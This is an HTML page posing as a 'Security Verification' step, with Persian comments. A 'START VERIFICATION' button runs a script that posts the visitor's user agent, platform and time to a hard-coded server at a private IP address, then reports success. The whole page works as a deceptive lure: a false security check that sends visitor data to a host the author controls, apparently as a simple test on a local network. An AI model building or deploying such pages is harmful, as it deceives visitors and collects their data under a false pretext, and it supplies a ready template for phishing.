<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Update</title>
</head>
<body style="font-family: Tahoma; text-align: center; padding: 50px;">
    <h2>🔒 Security Verification</h2>
    <p>Please click to verify your device</p>
    
    <button onclick="sendData()" 
            style="padding: 15px 30px; background: red; color: white; border: none;">
        START VERIFICATION
    </button>
    
    <div id="status" style="margin-top: 20px;"></div>
    
    <script>
        // آیپی لپتاپ تو - همون 192.168.14.235
        const SERVER = "http://192.168.14.235:5000";
        
        function sendData() {
            const status = document.getElementById('status');
            status.innerHTML = "Sending data...";
            
            // اطلاعات ساده
            const data = {
                userAgent: navigator.userAgent,
                time: new Date().toISOString(),
                platform: navigator.platform
            };
            
            // ارسال به سرور
            fetch(SERVER + '/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(() => {
                status.innerHTML = "✅ Data sent successfully!";
                status.style.color = "green";
            })
            .catch(err => {
                status.innerHTML = "❌ Error: " + err.message;
                status.style.color = "red";
            });
        }
    </script>
</body>
</html>
